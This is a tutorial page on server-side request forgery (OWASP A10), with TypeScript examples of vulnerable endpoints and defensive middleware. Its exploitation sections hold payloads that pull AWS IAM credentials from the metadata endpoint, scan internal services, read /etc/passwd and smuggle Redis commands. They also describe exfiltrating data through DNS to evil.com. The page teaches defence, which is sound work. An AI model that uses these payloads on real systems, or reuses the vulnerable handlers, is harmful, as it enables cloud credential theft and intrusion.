---
title: "A10: Server-Side Request Forgery (SSRF)"
description: Deep dive into SSRF attack vectors including cloud metadata theft, internal service access, SSRF mitigation with allowlists, DNS validation, network segmentation, blind SSRF, and TypeScript middleware for SSRF prevention
tags: [security, owasp, ssrf, cloud-security, network-segmentation, request-forgery]
difficulty: advanced
prerequisites:
  - owasp/index
  - Understanding of networking fundamentals (DNS, IP addressing)
  - Cloud infrastructure concepts (AWS, GCP, Azure)
  - TypeScript and Express.js fundamentals
lastReviewed: "2026-03-17"
---

# A10: Server-Side Request Forgery (SSRF)

SSRF is a new addition to the 2021 OWASP Top 10. It occurs when a web application fetches a remote resource without validating the user-supplied URL. This allows an attacker to coerce the application into sending crafted requests to unexpected destinations, even when protected by a firewall, VPN, or another type of network access control list.

SSRF has grown in severity due to the proliferation of cloud services. Cloud providers expose instance metadata services on well-known internal IP addresses (169.254.169.254), and SSRF can be used to steal cloud credentials, access internal services, and pivot within a cloud environment.

## Understanding SSRF

In a typical SSRF attack:

1. The attacker provides a URL to the vulnerable application
2. The server-side application makes a request to that URL
3. The response is returned to the attacker (full SSRF) or the attacker can infer information from side effects (blind SSRF)

The key insight is that the request originates from the server, which typically has different network access than the attacker — it can reach internal services, cloud metadata endpoints, and other resources behind the firewall.

```
┌──────────┐                    ┌──────────────┐
│ Attacker │  ──── URL ────►    │  Vulnerable  │
│          │                    │   Server     │
│          │  ◄── Response ──   │              │
└──────────┘                    └──────┬───────┘
                                       │
                          Server makes request to
                          attacker-controlled URL
                                       │
                              ┌────────▼────────┐
                              │                 │
                    ┌─────────┤  Internal       │
                    │         │  Network        │
                    │         │                 │
              ┌─────▼───┐    └────────┬────────┘
              │ Cloud    │            │
              │ Metadata │    ┌───────▼───────┐
              │ Service  │    │ Internal      │
              └──────────┘    │ Services      │
                              └───────────────┘
```

---

## 1. Cloud Metadata Service Attacks

Cloud providers expose instance metadata services that provide information about the running instance, including IAM credentials, network configuration, and user data. These endpoints are accessible from within the instance at well-known IP addresses.

### Cloud Metadata Endpoints

| Provider | Endpoint | Notes |
|----------|----------|-------|
| AWS | `http://169.254.169.254/latest/meta-data/` | IMDSv1 (no auth), IMDSv2 (token required) |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Requires `Metadata-Flavor: Google` header |
| Azure | `http://169.254.169.254/metadata/instance` | Requires `Metadata: true` header |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | No auth required |
| Oracle Cloud | `http://169.254.169.254/opc/v2/` | Requires `Authorization: Bearer Oracle` |

### Vulnerable Code

```typescript
import express, { Request, Response } from 'express';

// VULNERABLE: Fetching a URL provided by the user without validation
app.post('/api/fetch-url', async (req: Request, res: Response) => {
  const { url } = req.body;

  try {
    const response = await fetch(url);
    const data = await response.text();
    res.json({ data });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch URL' });
  }
});

// VULNERABLE: Image proxy (common in social media, link previews)
app.get('/api/image-proxy', async (req: Request, res: Response) => {
  const imageUrl = req.query.url as string;

  const response = await fetch(imageUrl);
  const buffer = Buffer.from(await response.arrayBuffer());

  res.setHeader('Content-Type', response.headers.get('content-type') || 'image/jpeg');
  res.send(buffer);
});

// VULNERABLE: Webhook delivery with user-controlled URL
app.post('/api/webhooks', async (req: Request, res: Response) => {
  const { url, events } = req.body;

  // Store the webhook URL — when events occur, the server will POST to this URL
  await db.query(
    'INSERT INTO webhooks (url, events) VALUES ($1, $2)',
    [url, JSON.stringify(events)]
  );

  res.status(201).json({ message: 'Webhook registered' });
});

// VULNERABLE: URL-based file import
app.post('/api/import', async (req: Request, res: Response) => {
  const { fileUrl } = req.body;

  const response = await fetch(fileUrl);
  const content = await response.text();

  // Process the imported file
  await processImport(content);

  res.json({ message: 'Import complete' });
});
```

### Exploitation

**AWS Metadata Theft:**

```bash
# Steal IAM credentials from AWS EC2 instance
POST /api/fetch-url
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
# Response: "my-instance-role"

POST /api/fetch-url
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/my-instance-role"
}
# Response:
# {
#   "AccessKeyId": "ASIAXXX...",
#   "SecretAccessKey": "SECRET...",
#   "Token": "SESSION_TOKEN...",
#   "Expiration": "2026-03-17T12:00:00Z"
# }

# Now the attacker has temporary AWS credentials with the instance's IAM role permissions
# They can access S3, DynamoDB, Lambda, etc.
```

**Accessing Internal Services:**

```bash
# Scan for internal services
POST /api/fetch-url
{"url": "http://10.0.0.1:8080/"}         # Internal web server
{"url": "http://10.0.0.1:6379/"}         # Redis (may expose data)
{"url": "http://10.0.0.1:9200/"}         # Elasticsearch
{"url": "http://10.0.0.1:27017/"}        # MongoDB
{"url": "http://localhost:8500/v1/agent/members"} # Consul
{"url": "http://kubernetes.default.svc/api/v1/"} # Kubernetes API

# Access internal admin panels
{"url": "http://internal-admin.corp.example.com/admin/"}
{"url": "http://jenkins.internal:8080/"}
{"url": "http://grafana.internal:3000/"}
```

**Protocol Smuggling:**

```bash
# Using different protocols
{"url": "file:///etc/passwd"}                    # Local file read
{"url": "gopher://internal-redis:6379/_SET%20pwned%20true"} # Redis command
{"url": "dict://internal-redis:6379/SET:pwned:true"}        # Dict protocol

# DNS rebinding
# 1. Attacker controls evil.com
# 2. First DNS lookup: evil.com → attacker's IP (passes allowlist check)
# 3. TTL expires, second lookup: evil.com → 169.254.169.254
# 4. Server fetches from 169.254.169.254
```

---

## 2. Mitigation — URL Validation and Allowlists

### Secure Code — Comprehensive SSRF Prevention Middleware

```typescript
import { URL } from 'url';
import dns from 'dns/promises';
import net from 'net';

// List of private/reserved IP ranges (RFC 1918, RFC 5735, RFC 6598, etc.)
const BLOCKED_IP_RANGES = [
  { start: '0.0.0.0', end: '0.255.255.255' },         // Current network
  { start: '10.0.0.0', end: '10.255.255.255' },        // Private (Class A)
  { start: '100.64.0.0', end: '100.127.255.255' },     // Shared address space (CGNAT)
  { start: '127.0.0.0', end: '127.255.255.255' },      // Loopback
  { start: '169.254.0.0', end: '169.254.255.255' },    // Link-local (metadata services!)
  { start: '172.16.0.0', end: '172.31.255.255' },      // Private (Class B)
  { start: '192.0.0.0', end: '192.0.0.255' },          // IETF Protocol Assignments
  { start: '192.0.2.0', end: '192.0.2.255' },          // Documentation
  { start: '192.88.99.0', end: '192.88.99.255' },      // IPv6 to IPv4 relay
  { start: '192.168.0.0', end: '192.168.255.255' },    // Private (Class C)
  { start: '198.18.0.0', end: '198.19.255.255' },      // Benchmark testing
  { start: '198.51.100.0', end: '198.51.100.255' },    // Documentation
  { start: '203.0.113.0', end: '203.0.113.255' },      // Documentation
  { start: '224.0.0.0', end: '239.255.255.255' },      // Multicast
  { start: '240.0.0.0', end: '255.255.255.255' },      // Reserved
];

function ipToNumber(ip: string): number {
  return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0) >>> 0;
}

function isPrivateIP(ip: string): boolean {
  if (!net.isIPv4(ip)) {
    // For IPv6, check for loopback, link-local, etc.
    if (ip === '::1' || ip.startsWith('fe80:') || ip.startsWith('fc') || ip.startsWith('fd')) {
      return true;
    }
    // IPv4-mapped IPv6 addresses
    if (ip.startsWith('::ffff:')) {
      return isPrivateIP(ip.slice(7));
    }
    return false;
  }

  const ipNum = ipToNumber(ip);

  for (const range of BLOCKED_IP_RANGES) {
    const startNum = ipToNumber(range.start);
    const endNum = ipToNumber(range.end);

    if (ipNum >= startNum && ipNum <= endNum) {
      return true;
    }
  }

  return false;
}

interface SSRFValidationOptions {
  allowedProtocols?: string[];
  allowedDomains?: string[];
  allowedPorts?: number[];
  blockPrivateIPs?: boolean;
  maxRedirects?: number;
  timeout?: number;
}

const DEFAULT_OPTIONS: Required<SSRFValidationOptions> = {
  allowedProtocols: ['https:'],
  allowedDomains: [],  // Empty = all public domains allowed
  allowedPorts: [443, 80],
  blockPrivateIPs: true,
  maxRedirects: 3,
  timeout: 10000,
};

async function validateURL(
  urlString: string,
  options: SSRFValidationOptions = {}
): Promise<{ valid: boolean; error?: string; resolvedIP?: string }> {
  const opts = { ...DEFAULT_OPTIONS, ...options };

  // Step 1: Parse the URL
  let parsedUrl: URL;
  try {
    parsedUrl = new URL(urlString);
  } catch {
    return { valid: false, error: 'Invalid URL format' };
  }

  // Step 2: Validate protocol
  if (!opts.allowedProtocols.includes(parsedUrl.protocol)) {
    return {
      valid: false,
      error: `Protocol ${parsedUrl.protocol} is not allowed. Allowed: ${opts.allowedProtocols.join(', ')}`,
    };
  }

  // Step 3: Validate port
  const port = parsedUrl.port
    ? parseInt(parsedUrl.port, 10)
    : parsedUrl.protocol === 'https:' ? 443 : 80;

  if (!opts.allowedPorts.includes(port)) {
    return {
      valid: false,
      error: `Port ${port} is not allowed`,
    };
  }

  // Step 4: Validate domain (if allowlist is specified)
  if (opts.allowedDomains.length > 0) {
    const hostname = parsedUrl.hostname.toLowerCase();
    const domainAllowed = opts.allowedDomains.some(domain => {
      if (domain.startsWith('*.')) {
        // Wildcard subdomain match
        const baseDomain = domain.slice(2);
        return hostname === baseDomain || hostname.endsWith(`.${baseDomain}`);
      }
      return hostname === domain;
    });

    if (!domainAllowed) {
      return {
        valid: false,
        error: 'Domain is not in the allowlist',
      };
    }
  }

  // Step 5: Block IP addresses used directly in the URL
  if (net.isIP(parsedUrl.hostname)) {
    if (opts.blockPrivateIPs && isPrivateIP(parsedUrl.hostname)) {
      return {
        valid: false,
        error: 'Direct IP addresses in private ranges are not allowed',
      };
    }
    return { valid: true, resolvedIP: parsedUrl.hostname };
  }

  // Step 6: Resolve DNS and validate the resolved IP
  // This is critical to prevent DNS rebinding attacks
  try {
    const addresses = await dns.resolve4(parsedUrl.hostname);

    if (addresses.length === 0) {
      return { valid: false, error: 'DNS resolution returned no addresses' };
    }

    // Check ALL resolved IPs (not just the first one)
    for (const ip of addresses) {
      if (opts.blockPrivateIPs && isPrivateIP(ip)) {
        return {
          valid: false,
          error: `Domain resolves to private IP address: ${ip}`,
        };
      }
    }

    return { valid: true, resolvedIP: addresses[0] };
  } catch {
    return { valid: false, error: 'DNS resolution failed' };
  }
}

// SSRF-safe fetch wrapper
async function safeFetch(
  urlString: string,
  options: SSRFValidationOptions & RequestInit = {}
): Promise<Response> {
  // Validate the URL before making the request
  const validation = await validateURL(urlString, options);

  if (!validation.valid) {
    throw new Error(`SSRF protection: ${validation.error}`);
  }

  // Use the resolved IP directly to prevent DNS rebinding (TOCTOU)
  const parsedUrl = new URL(urlString);
  const resolvedUrl = new URL(urlString);

  if (validation.resolvedIP && !net.isIP(parsedUrl.hostname)) {
    // Replace hostname with resolved IP and set Host header
    resolvedUrl.hostname = validation.resolvedIP;
  }

  const fetchOptions: RequestInit = {
    ...options,
    headers: {
      ...options.headers as Record<string, string>,
      Host: parsedUrl.hostname, // Original hostname for Host header
    },
    redirect: 'manual', // Handle redirects manually for validation
    signal: AbortSignal.timeout(options.timeout || 10000),
  };

  let response = await fetch(resolvedUrl.toString(), fetchOptions);

  // Handle redirects with validation
  let redirectCount = 0;
  const maxRedirects = options.maxRedirects || 3;

  while (
    [301, 302, 303, 307, 308].includes(response.status) &&
    redirectCount < maxRedirects
  ) {
    const location = response.headers.get('location');
    if (!location) break;

    // Resolve relative URLs
    const redirectUrl = new URL(location, urlString).toString();

    // Validate the redirect URL too!
    const redirectValidation = await validateURL(redirectUrl, options);
    if (!redirectValidation.valid) {
      throw new Error(`SSRF protection: redirect blocked — ${redirectValidation.error}`);
    }

    response = await fetch(redirectUrl, {
      ...fetchOptions,
      redirect: 'manual',
    });
    redirectCount++;
  }

  return response;
}
```

### Using the SSRF Prevention Middleware

```typescript
// SECURE: URL fetch endpoint with SSRF protection
app.post('/api/fetch-url', async (req: Request, res: Response) => {
  const { url } = req.body;

  if (!url || typeof url !== 'string') {
    return res.status(400).json({ error: 'URL is required' });
  }

  try {
    const response = await safeFetch(url, {
      allowedProtocols: ['https:'],
      blockPrivateIPs: true,
      maxRedirects: 3,
      timeout: 10000,
    });

    // Limit response size
    const contentLength = parseInt(response.headers.get('content-length') || '0', 10);
    if (contentLength > 5 * 1024 * 1024) { // 5 MB limit
      return res.status(413).json({ error: 'Response too large' });
    }

    const data = await response.text();
    res.json({ data: data.substring(0, 10000) }); // Truncate response
  } catch (error) {
    if (error instanceof Error && error.message.startsWith('SSRF protection:')) {
      // Log the SSRF attempt
      securityLogger.warn('SSRF attempt blocked', {
        event: 'ssrf.blocked',
        url,
        ip: req.ip,
        userId: (req as any).user?.id,
        error: error.message,
      });

      return res.status(400).json({ error: 'URL is not allowed' });
    }

    res.status(500).json({ error: 'Failed to fetch URL' });
  }
});

// SECURE: Image proxy with SSRF protection
app.get('/api/image-proxy', async (req: Request, res: Response) => {
  const imageUrl = req.query.url as string;

  if (!imageUrl) {
    return res.status(400).json({ error: 'URL is required' });
  }

  try {
    const response = await safeFetch(imageUrl, {
      allowedProtocols: ['https:'],
      blockPrivateIPs: true,
      timeout: 5000,
    });

    const contentType = response.headers.get('content-type') || '';

    // Validate content type is actually an image
    if (!contentType.startsWith('image/')) {
      return res.status(400).json({ error: 'URL does not point to an image' });
    }

    // Limit image size
    const contentLength = parseInt(response.headers.get('content-length') || '0', 10);
    if (contentLength > 10 * 1024 * 1024) { // 10 MB
      return res.status(413).json({ error: 'Image too large' });
    }

    const buffer = Buffer.from(await response.arrayBuffer());

    // Set security headers
    res.setHeader('Content-Type', contentType);
    res.setHeader('Content-Security-Policy', "default-src 'none'");
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.send(buffer);
  } catch (error) {
    if (error instanceof Error && error.message.startsWith('SSRF protection:')) {
      return res.status(400).json({ error: 'URL is not allowed' });
    }
    res.status(500).json({ error: 'Failed to fetch image' });
  }
});

// SECURE: Webhook registration with URL validation
app.post('/api/webhooks', async (req: Request, res: Response) => {
  const { url, events } = req.body;

  // Validate the webhook URL
  const validation = await validateURL(url, {
    allowedProtocols: ['https:'],
    blockPrivateIPs: true,
  });

  if (!validation.valid) {
    return res.status(400).json({
      error: `Invalid webhook URL: ${validation.error}`,
    });
  }

  // Verify the URL is reachable and returns a valid response
  try {
    const challenge = crypto.randomBytes(16).toString('hex');
    const verifyResponse = await safeFetch(`${url}?challenge=${challenge}`, {
      method: 'GET',
      allowedProtocols: ['https:'],
      blockPrivateIPs: true,
      timeout: 5000,
    });

    const body = await verifyResponse.text();
    if (body.trim() !== challenge) {
      return res.status(400).json({
        error: 'Webhook URL verification failed — must echo the challenge parameter',
      });
    }
  } catch {
    return res.status(400).json({
      error: 'Webhook URL is not reachable',
    });
  }

  // Store the webhook
  await db.query(
    'INSERT INTO webhooks (url, events, verified) VALUES ($1, $2, true)',
    [url, JSON.stringify(events)]
  );

  res.status(201).json({ message: 'Webhook registered and verified' });
});
```

---

## 3. Blind SSRF

Blind SSRF occurs when the server makes the request but does not return the response to the attacker. The attacker must infer information through side channels.

### Blind SSRF Techniques

**Timing-Based Detection:**

```bash
# Measure response time to determine if an internal port is open
# Open port: quick response (connection accepted/rejected by service)
# Closed port: slow response (connection timeout)
# Filtered port: medium response (RST or timeout from firewall)

POST /api/fetch-url
{"url": "http://10.0.0.1:22/"}    # SSH — quick response if open
# Response time: 50ms → port is open

POST /api/fetch-url
{"url": "http://10.0.0.1:12345/"} # Random port
# Response time: 10000ms → connection timeout → port is closed/filtered
```

**Out-of-Band Data Exfiltration:**

```bash
# If SSRF exists but response is not returned:
# 1. Attacker sets up a DNS server they control
# 2. Craft a URL that encodes stolen data in the hostname

POST /api/fetch-url
{"url": "http://STOLEN-DATA.attacker-controlled.com/"}
# The DNS query for STOLEN-DATA.attacker-controlled.com is logged by the attacker's DNS server

# For cloud metadata:
# Step 1: SSRF to metadata endpoint
POST /api/fetch-url
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"}
# No response shown

# Step 2: Use a redirect to exfiltrate
# Attacker's server at evil.com responds with a redirect to:
# http://EXFILTRATED-CREDS.evil.com/
# The DNS lookup reveals the credentials
```

### Blind SSRF Prevention

```typescript
// All the same protections apply, plus:

// 1. Don't make ANY outbound requests based on user input if possible
// 2. If you must, use a dedicated egress proxy with strict allowlists
// 3. Monitor DNS query logs for unusual patterns
// 4. Use IMDSv2 on AWS (requires a PUT request with token)

// AWS IMDSv2 configuration (instance metadata service v2)
// This requires a token obtained via a PUT request with a TTL header,
// which most SSRF attacks cannot perform
// aws ec2 modify-instance-metadata-options \
//   --instance-id i-xxx \
//   --http-endpoint enabled \
//   --http-tokens required \   # Require IMDSv2 tokens
//   --http-put-response-hop-limit 1  # Prevent token relay via containers
```

---

## 4. Network Segmentation

Network segmentation is a critical defense against SSRF. Even if an SSRF vulnerability exists, proper segmentation limits what the attacker can reach.

### Network Architecture for SSRF Defense

```
┌──────────────────────────────────────────────────────────┐
│  Public Subnet                                           │
│  ┌────────────┐                                          │
│  │  ALB/NLB   │ ← Internet traffic                      │
│  └─────┬──────┘                                          │
│        │                                                 │
├────────┼─────────────────────────────────────────────────┤
│  Application Subnet (Private)                            │
│  ┌─────▼──────┐  ┌────────────┐                         │
│  │  App Server │  │  Egress    │ ← Only allows outbound  │
│  │             ├──►  Proxy     │   to specific domains   │
│  └─────┬──────┘  └─────┬──────┘                         │
│        │               │                                 │
│  Firewall rules:       │                                 │
│  - No access to        │                                 │
│    169.254.169.254     │                                 │
│  - No access to        │                                 │
│    other subnets       │                                 │
│    except data tier    │                                 │
│                        │                                 │
├────────┼───────────────┼─────────────────────────────────┤
│  Data Subnet (Private)  │                                │
│  ┌─────▼──────┐         │                                │
│  │  Database   │         │                                │
│  └─────────────┘         │                                │
│  Firewall rules:         │                                │
│  - Only accepts          │                                │
│    connections from      │                                │
│    app subnet on         │                                │
│    port 5432             │                                │
└──────────────────────────┘
```

### AWS Security Group Configuration

```typescript
// AWS CDK example for SSRF-resistant network architecture
import * as ec2 from 'aws-cdk-lib/aws-ec2';

// VPC with isolated subnets
const vpc = new ec2.Vpc(this, 'AppVpc', {
  maxAzs: 2,
  subnetConfiguration: [
    {
      name: 'Public',
      subnetType: ec2.SubnetType.PUBLIC,
    },
    {
      name: 'Application',
      subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,
    },
    {
      name: 'Data',
      subnetType: ec2.SubnetType.PRIVATE_ISOLATED,
    },
  ],
});

// Application security group
const appSg = new ec2.SecurityGroup(this, 'AppSg', {
  vpc,
  description: 'Application server security group',
});

// Block access to metadata service
// Use IMDSv2 and set hop limit to 1 on all EC2 instances

// Database security group — only allows app servers
const dbSg = new ec2.SecurityGroup(this, 'DbSg', {
  vpc,
  description: 'Database security group',
});

dbSg.addIngressRule(
  appSg,
  ec2.Port.tcp(5432),
  'Allow PostgreSQL from app servers only'
);
```

---

## 5. Egress Proxy for SSRF Defense

An egress proxy inspects and controls all outbound HTTP requests from the application. This is the most effective defense against SSRF because it centralizes URL validation.

```typescript
// Squid proxy configuration for egress filtering
// /etc/squid/squid.conf

/*
# Only allow HTTPS connections to specific domains
acl allowed_domains dstdomain .github.com
acl allowed_domains dstdomain .npmjs.org
acl allowed_domains dstdomain api.stripe.com
acl allowed_domains dstdomain api.sendgrid.com

# Block all private IP ranges
acl private_networks dst 10.0.0.0/8
acl private_networks dst 172.16.0.0/12
acl private_networks dst 192.168.0.0/16
acl private_networks dst 169.254.0.0/16
acl private_networks dst 127.0.0.0/8

http_access deny private_networks
http_access allow allowed_domains
http_access deny all

# Only allow HTTPS
acl SSL_ports port 443
http_access deny !SSL_ports
*/

// Application configured to use the egress proxy
const httpsAgent = new HttpsProxyAgent('http://egress-proxy.internal:3128');

async function fetchExternalResource(url: string): Promise<Response> {
  // All requests go through the proxy, which enforces domain allowlists
  // and blocks access to private IP ranges
  return fetch(url, {
    agent: httpsAgent as any,
    timeout: 10000,
  });
}
```

---

## 6. DNS Rebinding Protection

DNS rebinding is a technique where an attacker controls a domain that initially resolves to a safe IP but later resolves to an internal IP after the application has passed the URL validation check.

```typescript
// Protection against DNS rebinding: resolve DNS and pin the IP

async function fetchWithDNSPinning(url: string): Promise<Response> {
  const parsedUrl = new URL(url);
  const hostname = parsedUrl.hostname;

  // Resolve DNS
  const addresses = await dns.resolve4(hostname);

  if (addresses.length === 0) {
    throw new Error('DNS resolution returned no addresses');
  }

  // Validate ALL resolved IPs
  for (const ip of addresses) {
    if (isPrivateIP(ip)) {
      throw new Error(`DNS rebinding detected: ${hostname} resolves to ${ip}`);
    }
  }

  // Create a custom agent that connects to the resolved IP
  // This prevents DNS rebinding because we use the IP we validated
  const agent = new https.Agent({
    lookup: (hostname, options, callback) => {
      // Return the IP we already validated
      callback(null, addresses[0], 4);
    },
  });

  return fetch(url, {
    agent: agent as any,
    headers: {
      Host: hostname, // Original hostname for virtual hosting
    },
  });
}
```

---

## Prevention Checklist

- [ ] Validate all user-supplied URLs before making server-side requests
- [ ] Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, 127.x)
- [ ] Block requests to cloud metadata endpoints (169.254.169.254)
- [ ] Use allowlists for permitted domains (not blocklists)
- [ ] Only allow HTTPS protocol (block file://, gopher://, dict://, ftp://)
- [ ] Resolve DNS and validate the resulting IP before connecting (prevent DNS rebinding)
- [ ] Validate redirect targets (SSRF via redirect)
- [ ] Use an egress proxy for all outbound HTTP traffic
- [ ] Enable IMDSv2 on AWS EC2 instances (or equivalent on other clouds)
- [ ] Implement network segmentation (application servers cannot reach metadata services)
- [ ] Set hop limit to 1 for instance metadata
- [ ] Limit response size and processing time for outbound requests
- [ ] Log and alert on SSRF attempts
- [ ] Disable unnecessary URL schemes in the application
- [ ] Use a dedicated service for URL fetching with strict controls

## References

- CWE-918: Server-Side Request Forgery
- OWASP SSRF Prevention Cheat Sheet
- AWS IMDSv2 Documentation
- PortSwigger Web Security Academy — SSRF
- Orange Tsai — A New Era of SSRF (BlackHat 2017)
- Hackerone SSRF Reports (public disclosures)
